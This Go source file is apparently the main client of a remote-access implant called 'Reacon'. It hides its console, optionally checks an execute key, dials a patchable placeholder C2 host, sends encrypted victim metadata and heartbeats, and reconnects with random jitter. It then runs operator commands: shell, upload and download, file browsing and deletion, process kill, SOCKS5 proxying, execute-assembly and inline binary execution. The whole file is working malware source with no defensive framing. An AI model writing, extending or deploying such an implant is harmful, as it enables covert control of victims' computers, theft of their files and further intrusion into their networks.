package main

import (
	"Reacon/pkg/communication"
	"Reacon/pkg/config"
	"Reacon/pkg/encrypt"
	"Reacon/pkg/services"
	"Reacon/pkg/utils"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type TCPClient struct {
	Client            *net.TCPConn
	Buffer            []byte
	BufferSize        int64
	MS                bytes.Buffer
	IsConnected       bool
	SendSync          sync.Mutex
	ActivatePong      bool
	RemarkMessage     string
	RemarkClientColor string
	keepAlive         *time.Ticker
	// Implementing timers and ThreadPool would require more context and may need external libraries
}

// assuming for the sake of example

func (s *TCPClient) InitializeClient(host string) {
	addr, err := net.ResolveTCPAddr("tcp", host)
	if err != nil {
		s.IsConnected = false
		return
	}

	conn, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		s.IsConnected = false
		return
	}
	utils.TCPClient = conn

	s.Client = conn
	if s.Client != nil {
		s.IsConnected = true
		s.Buffer = make([]byte, 4)
		s.MS.Reset()

		//firstBlood
		if len(utils.MetaInfo) == 0 {
			utils.MetaInfo, _ = utils.EncryptedMetaInfo()
			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
		}
		firstBloodInt := 1
		firstBloodBytes := utils.WriteInt(firstBloodInt)
		firstBloodMsg := utils.BytesCombine(firstBloodBytes, utils.MetaInfo)
		communication.Send(firstBloodMsg, s.Client)

		// Implementing Timer using time package. Assuming KeepAlivePacket function exists
		s.keepAlive = time.NewTicker(8 * time.Second)

		// Start a goroutine to handle the ticks
		go func() {
			for range s.keepAlive.C {
				s.KeepAlivePacket(s.Client)
			}
		}()

		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}

func (s *TCPClient) ReadServerData() {
	if s.Client == nil || !s.IsConnected {
		s.IsConnected = false
		return
	}

	n, err := s.Client.Read(s.Buffer)
	if err != nil {
		s.IsConnected = false
		return
	}

	if n == 4 {
		s.MS.Write(s.Buffer)
		s.BufferSize = int64(binary.BigEndian.Uint32(s.MS.Bytes()))
		s.MS.Reset()

		if s.BufferSize > 0 {
			s.Buffer = make([]byte, s.BufferSize)
			for int64(s.MS.Len()) != s.BufferSize {
				rc, err := s.Client.Read(s.Buffer)
				if err != nil {
					s.IsConnected = false
					return
				}
				s.MS.Write(s.Buffer[:rc])
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
			if int64(s.MS.Len()) == s.BufferSize {
				data := s.MS.Bytes()
				if data != nil {
					totalLen := len(data)
					if totalLen > 0 {
						rawData, err := encrypt.DecodeBase64(data)
						if err != nil {
							fmt.Println(err)
						}
						data, err = encrypt.Decrypt(rawData)
						if err != nil {
							fmt.Println(err)
						}
						decrypted, err := encrypt.Decrypt(data)
						if err != nil {
							communication.ErrorProcess(err)
							fmt.Println(err)
						}
						if len(decrypted) < 4 {
							return
						}
						cmdType := binary.BigEndian.Uint32(decrypted[:4])
						cmdBuf := decrypted[4:]
						if cmdBuf != nil {
							var err error
							var callbackType int
							var result []byte
							switch cmdType {
							case services.SHELL: // shell
								result, err = services.CmdShell(cmdBuf)
								callbackType = 0
							case services.UploadStart: //upload 第一次
								result, err = services.CmdUpload(cmdBuf, true)
								callbackType = 0
							case services.UploadLoop: //upload 后续的upload
								result, err = services.CmdUpload(cmdBuf, false)
								callbackType = 0
							case services.DOWNLOAD: //download   2
								result, err = services.CmdDownload(cmdBuf)
								callbackType = 0
							case services.FileBrowse: //File Browser
								result, err = services.CmdFileBrowse(cmdBuf)
								callbackType = services.FileBrowse
							case services.CD: //cd
								result, err = services.CmdCd(cmdBuf)
								callbackType = 0
							case services.SLEEP: //sleep
								result, err = services.CmdSleep(cmdBuf)
								callbackType = 0
							case services.PAUSE: //pause
								result, err = services.CmdPause(cmdBuf)
								callbackType = 0
							case services.PWD: //pwd
								result, err = services.CmdPwd()
								callbackType = 0
							case services.EXIT: //exit
								result, err = services.CmdExit()
								if err == nil {
									os.Exit(1)
								}
								callbackType = 0
							case services.EXECUTE: // windows 后台执行程序
								result, err = services.CmdExecute(cmdBuf)
								callbackType = 0
							case services.PS: // ps 列出进程
								result, err = services.CmdPs()
								callbackType = services.PS
							case services.KILL: //kill
								result, err = services.CmdKill(cmdBuf)
								callbackType = 0
							case services.MKDIR: //mkdir
								result, err = services.CmdMkdir(cmdBuf)
								callbackType = 0
							case services.DRIVES: //list drives  2
								result, err = services.CmdDrives()
								callbackType = services.DRIVES
							case services.RM: //rm
								result, err = services.CmdRm(cmdBuf)
								callbackType = 0
							case services.CP: //cp
								result, err = services.CmdCp(cmdBuf)
								callbackType = 0
							case services.MV: //mv
								result, err = services.CmdMv(cmdBuf)
								callbackType = 0
							case services.FileContent:
								result, err = services.GetFileContent(cmdBuf)
								callbackType = 0
							case services.Scoks5Start:
								result, err = services.SocksConnect(cmdBuf)
								callbackType = 0
							case services.Scoks5Close:
								result, err = services.SocksClose()
								callbackType = 0
							case services.ExecuteAssembly:
								result, err = services.Execute_Assembly(cmdBuf)
								callbackType = 0
							case services.InlineBin:
								result, err = services.Inline_bin(cmdBuf)
								callbackType = 0
							default:
								err = errors.New("not supported command")
							}
							// convert charset here
							if err != nil {
								communication.ErrorProcess(err)
							} else {
								if callbackType >= 0 {
									communication.DataProcess(callbackType, result)
								}
							}
						}
					}
				}
				s.Buffer = make([]byte, 4)
				s.MS.Reset()
			} else {
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
		}
		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}

func (s *TCPClient) KeepAlivePacket(conn net.Conn) {
	heartBeatInt := 3
	heartBeatBytes := utils.WriteInt(heartBeatInt)
	heartBeatMsg := utils.BytesCombine(heartBeatBytes, utils.MetaInfo)

	communication.Send(heartBeatMsg, conn)
	s.ActivatePong = true
}

func (s *TCPClient) Reconnect(host string) {
	s.CloseConnection()
	s.InitializeClient(host)
}

func (s *TCPClient) CloseConnection() {
	if s.Client != nil {
		s.Client.Close()
	}
	s.MS.Reset()
}

func Run_main(host string) {
	socket := TCPClient{}
	socket.InitializeClient(host)

	r := rand.New(rand.NewSource(time.Now().UnixNano())) // Create a new random generator

	for {
		if !socket.IsConnected {
			socket.Reconnect(host)
		}
		time.Sleep(time.Duration(r.Intn(5000)) * time.Millisecond)
	}
}

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	errConsole := services.HideConsole()
	if errConsole != nil && errConsole.Error() != "" {
		fmt.Println(errConsole)
	}
	// windows 下设置不需要DPI缩放
	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "" {
		fmt.Println(errDPI)
	}

	host := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	host = strings.ReplaceAll(host, " ", "")

	Run_main(host)
}
